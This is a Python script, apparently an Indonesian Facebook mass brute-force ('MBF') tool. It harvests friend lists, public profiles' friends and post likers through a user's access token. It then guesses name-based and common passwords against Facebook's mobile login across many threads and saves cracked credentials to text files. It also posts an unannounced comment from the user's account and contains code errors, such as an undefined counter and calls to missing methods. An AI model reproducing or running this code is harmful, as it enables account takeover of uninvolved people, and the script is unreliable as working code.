#mau recod? sertakan author hhe 
#AUTHOR : latip176 & Radhin 123
#module import
import requests as req,json,time,pyfiglet,os
from concurrent.futures import ThreadPoolExecutor as Bool
from bs4 import BeautifulSoup as parser
try:ua=req.get("https://api-asutoolkit.cloudaccess.host/useragent.txt").text.strip()
except req.exceptions.ConnectionError:exit("[!] Kesalahan Pada Koneksi")

#save data
os.system("clear")
ok,cp,die=0,0,0

class crack:
	
	def __init__(self,token):
		self.token=token
	def crackLike(self,user,pw,ttl):
		global ok,cp,die
		data={}
		ses=req.Session()
		ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent":ua,"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
		a=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text,"html.parser")
		b=["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for c in a("input"):
			try:
				if c.get("name") in b:data.update({c.get("name"):c.get("value")})
				else:continue
			except:pass
		data.update({"email":user,"pass":pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		d=ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
		if "c_user" in d.cookies:
			ok+=1
			print(f"\r\x1b[1;32m[LIVE] {user} | {pw} | {ttl}         \x1b[0m",end="")
			print("")
			save1=open("live.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
		elif "checkpoint" in d.cookies:
			cp+=1
			print(f"\r\x1b[1;33m[CHEK] {user} | {pw} | {ttl}      \x1b[0m",end="")
			print("")
			semoa+=1
			save2=open("chek.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
		else:
			die+=1
		print(f"\r[=] OK:-{str(ok)} CP:-{str(cp)} DIE:-{str(die)}",end="")
	def crackTeman(self,user,pw,ttl):
		global ok,cp,die
		data={}
		ses=req.Session()
		ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent":ua,"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
		a=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text,"html.parser")
		b=["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for c in a("input"):
			try:
				if c.get("name") in b:data.update({c.get("name"):c.get("value")})
				else:continue
			except:pass
		data.update({"email":user,"pass":pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		d=ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
		if "c_user" in d.cookies:
			ok+=1
			print(f"\r\x1b[1;32m[LIVE] {user} | {pw} | {ttl}         \x1b[0m",end="")
			print("")
			save1=open("live.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
		elif "checkpoint" in d.cookies:
			cp+=1
			print(f"\r\x1b[1;33m[CHEK] {user} | {pw} | {ttl}      \x1b[0m",end="")
			print("")
			semoa+=1
			save2=open("check.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
		else:
			die+=1
		print(f"\r[=] OK:-{str(ok)} CP:-{str(cp)} DIE:-{str(die)}",end="")
	def crackPub(self,user,pw,ttl):
		global ok,cp,die
		data={}
		ses=req.Session()
		ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent":ua,"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
		a=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text,"html.parser")
		b=["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for c in a("input"):
			try:
				if c.get("name") in b:data.update({c.get("name"):c.get("value")})
				else:continue
			except:pass
		data.update({"email":user,"pass":pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		d=ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
		if "c_user" in d.cookies:
			ok+=1
			print(f"\r\x1b[1;32m[LIVE] {user} | {pw} | {ttl}         \x1b[0m",end="")
			print("")
			semoa+=1
			save1=open("live.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
		elif "checkpoint" in d.cookies:
			cp+=1
			print(f"\r\x1b[1;33m[CHEK] {user} | {pw} | {ttl}      \x1b[0m",end="")
			print("")
			semoa+=1
			save2=open("chek.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
		else:
			die+=1
		print(f"\r[=] OK:-{str(ok)} CP:-{str(cp)} DIE:-{str(die)}",end="")
	def sendTeman(self):
		os.system('clear')
		title=pyfiglet.figlet_format("Crack Teman")
		print(title+"\nauthor : latipharkat & Radhin_ | Wa : wa.me/+62 838-7039-6203 & wa.me/+62 823-7315-8947\n")
		time.sleep(2)
		print("[+] Crack sedang berjalan...\n")
		r=json.loads(req.get(f"https://graph.facebook.com/me/friends?access_token={self.token}").text)
		with Bool(max_workers=35) as tokai:
			for x in r['data']:
				id=x['id']
				r2=json.loads(req.get(f"https://graph.facebook.com/{id}?access_token={self.token}").text)
				try:user=r2['username']
				except KeyError:pass
				try:ttl=r2['birthday']
				except KeyError:pass
				pas=[r2['first_name']+"123",r2['first_name']+"12345","123456","12345678","power by latip","power by Radhin","power by latip","power by Radhin","power by latip","power by Radhin","power by latip & Radhi","power by yokenza yz mods WhatsApp",r2['last_name']+"123",r2['last_name']+"12345"]
				try:
					try:[tokai.submit(crack(self.token).crackTeman,user,pw,ttl) for pw in pas]
					except:[tokai.submit(crack(self.token).crackTeman,id,pw,ttl) for pw in pas]
				except:pass
		print(f"\nHasil yang anda dapatkan OK:-{ok} CP:-{cp}\n")
		a=input("[KEMBALI]")
		crack(self.token).judul()
	def sendPublik(self):
		os.system('clear')
		title=pyfiglet.figlet_format("Crack Publik")
		print(title+"\nauthor: latipharkat & Radhin Al Haady_ | Wa : wa.me/+62 838-7039-6203 & wa.me/+62 823-7315-8947/\n")
		try:
			idPub=input("Masukan Target ID Publik : ")
			r=json.loads(req.get(f"https://graph.facebook.com/{idPub}?access_token="+self.token).text)
			print("\n[+] Nama Target Publik :",r['name'],"\n[+] crak berjalan...\n")
			time.sleep(2)
			print('CTRL + Z UNTUK STOP\n')
		except KeyError:
			print("[!] Target Publik Tidak dapat di temukan")
			time.sleep(2)
			crack(self.token).judul()
		with Bool(max_workers=35) as tokai:
			r2=json.loads(req.get(f"https://graph.facebook.com/{idPub}/friends?access_token="+self.token).text)
			for x in r2['data']:
				id=x['id']
				r3=json.loads(req.get(f"https://graph.facebook.com/{id}?access_token="+self.token).text)
				try:user=r3['username']
				except:pass
				try:ttl=r3['birthday']
				except:pass
				pas=[r3['first_name']+"123",r3['first_name']+"12345","123456","12345678","power by latip","power by Radhin","power by latip","power by Radhin","power by latip","power by Radhin","power by latip & Radhi","power by yokenza yz mods WhatsApp",r3['last_name']+"123",r3['last_name']+"12345"]
				try:
					try:[tokai.submit(crack(self.token).crackPub,user,pw,ttl) for pw in pas]
					except:[tokai.submit(crack(self.token).crackPub,id,pw,ttl) for pw in pas]
				except:pass
		print(f"\nHasil Dapet OK:-{ok} CP:-{cp}\n")
		a=input("[KEMBALI]")
		crack(self.token).judul()

	def sendLike(self):
		os.system('clear')
		title=pyfiglet.figlet_format("Dump Like")
		print(title+"\nauthor: latipharkat & Radhin Al Haady_ | Wa : wa.me/+62 838-7039-6203 & wa.me/+62 823-7315-8947\n")
		idPost=input("Masukan ID Postingan : ")
		try:
			r=json.loads(req.get(f"https://graph.facebook.com/{idPost}/likes?access_token="+self.token).text)
			for x in r['data']:id=x['id']
			with Bool(max_workers=35) as tokai:
				r2=json.loads(req.get(f"https://graph.facebook.com/{id}?access_token="+self.token).text)
				try:user=r2['username']
				except:pass
				try:ttl=r2['birthday']
				except:pass
				pas=[r2['first_name']+"123",r2['first_name']+"12345","123456","12345678","power by latip","power by Radhin","power by latip","power by Radhin","power by latip","power by Radhin","power by latip & Radhi","power by yokenza yz mods WhatsApp",r2['last_name']+"123",r2['last_name']+"12345"]
				try:
					try:[tokai.submit(crack(self.token).crackLike,user,pw,ttl) for pw in pas]
					except:[tokai.submit(crack(self.token).crackLike,id,pw,ttl) for pw in pas]
				except:pass
		except KeyError:
			print("[!] Postingan Tidak Ada")
			time.sleep(2)
			crack(self.token).menu()
		print(f"\nHasil Dapet OK:-{ok} CP:-{cp}\n")
		a=input("[KEMBALI]")
		crack(self.token).judul()
	
	def judul(self):
		os.system("clear")
		title=pyfiglet.figlet_format("MBF-MENU")
		r=json.loads(req.get("https://graph.facebook.com/me?access_token="+self.token).text)
		print(title+"\nUID :",r['id'],"\nNAMA :",r['name'],"\nTanggal-Lahir :",r['birthday'],"\n===================================\n[1]. Crack Daftar Teman\n[2]. Crack ID Publik\n[3]. Dump Dari ID Postingan\n[99]. Logout Akun\n")
		crack(self.token).menu()
	def menu(self):
		pilih=input("Masukan Pilihan Anda : ")
		if pilih in (""," ","   "):
			print("[!] Jangan Kosong jancok")
			crack(self.token).menu()
		elif pilih=="1":crack(self.token).sendTemanFacebook()
		elif pilih=="2":crack(self.token).sendPublikFacebook()
		elif pilih=="3":crack(self.token).sendLikeFacebook()
		elif pilih=="99":
			os.system("rm -rf tt.txt")
			exit("[√] ANDA TELAH KELUAR")
		else:
			print("[!] Pilihan Tidak Ada")
			crack(self.token).menu()
def judul():
	os.system("clear")
	title=pyfiglet.figlet_format("Login Token")
	print(title+"\n[1]. Login menggunakan akses token Facebook\n[2]. Cara Mendapatkan Access Token Facebook POWER BY LATIP\n[00]. Keluar Dari Script Janvok\n")
	login()
def login():
	pilih=input("[?] pilih mana bre : ")
	if pilih in (""," "):
		print("[!] 😑 Goblok kok kosong 🤦")
		judul()
	elif pilih=="1":
		token=input("[+] Masukan Access Token Facebook Anda yang bener ya bep : ")
		try:
			r=json.loads(req.get("https://graph.facebook.com/me?access_token="+token).text)
			r2=req.post("https://graph.facebook.com/124858336308242/comments/?message=Hy Namaku "+r['name']+f"&access_token={token}")
			os.system('clear')
			print("[√] Login Berhasil\nNama Akun :",r['name'])
			time.sleep(2)
			saveLogin=open('tt.txt','a').write(token)
			time.sleep(2)
			crack(token).judul()
		except KeyError:
			print("[×] Token Anda Salah")
			time.sleep(2)
			login()
	elif pilih=="2":os.system("xdg-open https://latipharkat.blogspot.com/2021/01/cara-mendapatkan-access-token-facebook.html?m=1")
	else:
		print("[!] 🙄kau itu plih mana goblok")
		judul()
def logikaLogin():
	os.system("clear")
	try:
		token=open("tt.txt","r").read()
		r=json.loads(req.get(f"https://graph.facebook.com/me?access_token={token}").text)
		os.system("clear")
		print("[√] sip akun nda sudah login\nNama Akun :",r['name'],"\n")
		time.sleep(2)
		crack(token).judul()
	except KeyError:
		print("[!] Token Invalid")
		os.system("rm -rf tt.txt")
		time.sleep(2)
		judul()
	except FileNotFoundError:
		print("[!] anda belum login☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️")
		time.sleep(2)
		judul()

if __name__=="__main__":
	logikaLogin()